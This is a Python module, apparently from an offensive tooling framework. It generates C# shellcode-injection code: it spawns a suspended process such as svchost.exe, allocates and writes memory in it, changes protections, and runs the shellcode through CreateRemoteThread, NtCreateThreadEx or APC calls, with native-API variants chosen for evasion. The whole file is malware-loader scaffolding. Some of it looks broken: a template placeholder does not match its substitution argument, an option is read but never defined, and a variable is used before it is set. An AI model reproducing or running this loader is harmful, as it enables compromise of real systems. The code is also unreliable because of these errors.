from string import Template
from common.utils.argumentparser import ArgumentParser

class spawnandinject:
    def __init__(self, arguments):
        parser = ArgumentParser(modulename=self.__class__.__name__)
        parser.add_argument(name='spawn', default='CreateProcessA', help='Which function to use to spawn a new process', choices={'CreateProcessA'})
        parser.add_argument(name='allocate', default='VirtualAllocEx', help='Function to use for allocating memory', choices={'VirtualAllocEx', 'NtAllocateVirtualMemory'})
        parser.add_argument(name='write', default='WriteProcessMemory', help='Function used for writing memory', choices={'WriteProcessMemory', 'NtWriteVirtualMemory'})
        parser.add_argument(name='execute', default='CreateRemoteThread', help='Function used for executing the shellcode', choices={'CreateRemoteThread', 'NtCreateThreadEx', 'QueueUserAPC', 'NtQueueApcThread'})
        parser.add_argument(name='protect', default='VirtualProtectEx', help='Function used for changing memory protections', choices={'VirtualProtectEx', 'NtProtectVirtualMemory'})
        parser.add_argument(name='wait', default='WaitForSingleObject', help='Function used for waiting for execution to finish. Only applicable for CreateRemoteThread and NtCreateThreadEx', choices={'WaitForSingleObject', 'NtWaitForSingleObject', 'None'})
        parser.add_argument(name='close', default='CloseHandle', help='Function used for closing handles after use', choices={'CloseHandle'})
        parser.add_argument(name='target', default='C:\\\\windows\\\\system32\\\\svchost.exe', help='Target process for spawning or injecting', choices={})
        parser.add_argument(name='perm', default='rx', help='Protection of memory when shellcode executes', choices={'rx': '0x20', 'rwx':'0x40'})
        self.args = parser.parse_args(arguments)     


        # Target override if not specified
        if self.args['target'] == '':
            if self.args['mode'] == 'inject':
                self.args['target'] = 'explorer.exe'
            elif self.args['mode'] == 'spawn':
                self.args['target'] = 'C:\\\\windows\\\\system32\\\\svchost.exe'
        else:
            self.args['target'] = self.args['target'].replace('\\','\\\\')

        # Override wait option
        if self.args['execute'] in ['NtCreateThreadEx', 'CreateRemoteThread']:
            self.args['wait'] = 'WaitForSingleObject'
        else:
            self.args['wait'] = 'None'

    def imports(self) -> list[str]:
        return ["using System;",
                "using System.Collections.Generic;",
                "using System.Linq;",
                "using System.Text;",
                "using System.Threading.Tasks;",
                "using System.Diagnostics;",
                "using System.Runtime.InteropServices;"]

    def compilerOptions(self) -> list[str]:
        return []

    def codeblocks(self) -> str:
        return """
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb; 
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }
"""


    def template(self) -> str:

        template = """
            {transformers}
"""

        if self.args['spawn'] == 'CreateProcessA':
            template += Template("""
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            {CreateProcessA}(null, "$target", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
""").substitute(target=self.args['target'])

        if self.args['allocate'] == 'VirtualAllocEx':
            template += """
            IntPtr bytesWritten;
            IntPtr threadId;
            IntPtr pRemoteCode = {VirtualAllocEx}(pi.hProcess, IntPtr.Zero, {shellcodeSize}, 0x3000, 0x04);
"""
        elif self.args['allocate'] == 'NtAllocateVirtualMemory':
            template += """
            IntPtr addr = IntPtr.Zero;
            IntPtr regionSize = new IntPtr(shellcode.Length); 
            {NtAllocateVirtualMemory}(pi.hProcess, out addr, 0, ref regionSize, 0x3000, 0x04);
"""

        if self.args['write'] == 'WriteProcessMemory':
            template += """
            {WriteProcessMemory}(pi.hProcess, pRemoteCode, shellcode, (ulong){shellcodeSize}, out bytesWritten);
"""
        elif self.args['write'] == 'NtWriteVirtualMemory':
            template += """
            IntPtr numBytes = new IntPtr(shellcode.Length); 
            IntPtr numWritten = IntPtr.Zero;
            {NtWriteVirtualMemory}(pi.hProcess, addr, shellcode, ref numBytes, out numWritten);
"""

        if self.args['protect'] == 'VirtualProtectEx':
            template += Template("""
            IntPtr oldProtect;
            {VirtualProtectEx}(pi.hProcess, pRemoteCode, (ulong){shellcodeSize}, $memoryPermission, out oldProtect);
""").substitute(perm=self.args['perm'])
        elif self.args['protect'] == 'NtProtectVirtualMemory':
            template += Template("""
            IntPtr oldProtect = IntPtr.Zero;
            IntPtr regSize = new IntPtr(shellcode.Length); 
            {NtProtectVirtualMemory}(pi.hProcess, ref addr, ref regSize, $perm, out oldProtect);
""").substitute(perm = self.args['perm'])


        if self.args['execute'] == 'CreateRemoteThread':
            template += """
            IntPtr hThread = {CreateRemoteThread}(pi.hProcess, IntPtr.Zero, 0, pRemoteCode, IntPtr.Zero, 0, out threadId);
"""
        elif self.args['execute'] == 'NtCreateThreadEx':
            template += """
            IntPtr hThread = IntPtr.Zero;
            {NtCreateThreadEx}(out hThread, 0x001FFFFF, IntPtr.Zero, pi.hProcess, addr, IntPtr.Zero, 0, 0, 0, 0, IntPtr.Zero );
"""
        elif self.args['execute'] == 'QueueUserAPC':
            template += """
            {QueueUserAPC}(addr, pi.hThread, IntPtr.Zero);
"""
        elif self.args['execute'] == 'NtQueueApcThread':
            template += """
            {NtQueueApcThread}(pi.hThread, addr, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
"""


        if self.args['wait'] == 'WaitForSingleObject':
            template += """
            {WaitForSingleObject}(hThread, 500);
"""
        elif self.args['wait'] == 'NtWaitForSingleObject':
            template += """
            {NtWaitForSingleObject}(hThread, false, IntPtr.Zero);
"""
        elif self.args['wait'] == 'None':
            template += """
            {ResumeThread}(pi.hThread);
"""

        return template